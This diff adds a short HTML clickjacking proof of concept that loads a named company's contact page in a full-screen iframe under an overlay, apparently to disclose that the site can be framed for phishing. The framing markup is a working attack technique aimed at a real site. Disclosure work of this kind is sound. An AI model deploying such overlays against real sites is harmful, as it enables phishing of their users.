@@ -1,0 +1,14 @@
+<link href="https://unpkg.com/tailwindcss@^1.0/dist/tailwind.min.css" rel="stylesheet"> 
+
+<!-- Arbitrary phishing content as follows -->
+<div class="absolute grid place-items-center h-screen w-screen">
+<div class="mb-4 px-6 py-5 shadow-2xl bg-blue-600 place-items-center">
+<center>This page superimposes<br><strong>novawaresystems.com/email-us</strong>
+<br>behind arbitrary phishing content.<br>
+<br>Click to see page source <a href="https://github.com/elogada/elogada.github.io/blob/main/novaware-poc.htm">HERE</a></center>
+</div></div>
+
+<!-- iframe (clickjacking attack) as follows-->
+<iframe class="h-screen w-screen" id="pageItem" src="https://novawaresystems.com/email-us/"></iframe>
+
+
